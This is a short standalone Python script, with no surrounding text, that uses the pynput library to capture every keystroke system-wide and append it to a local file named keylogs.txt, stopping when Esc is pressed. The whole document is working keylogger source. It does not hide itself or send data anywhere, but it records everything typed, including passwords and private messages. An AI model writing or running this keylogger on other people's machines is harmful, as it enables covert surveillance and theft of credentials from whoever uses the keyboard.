```python
import pynput.keyboard

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as f:
            if key == pynput.keyboard.Key.space:
                f.write('[SPACE]')
            elif key == pynput.keyboard.Key.enter:
                f.write('\n[ENTER]\n')
            else:
                f.write(str(key).strip("'"))
    except Exception as e:
        print(f"Error occurred: {e}")

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```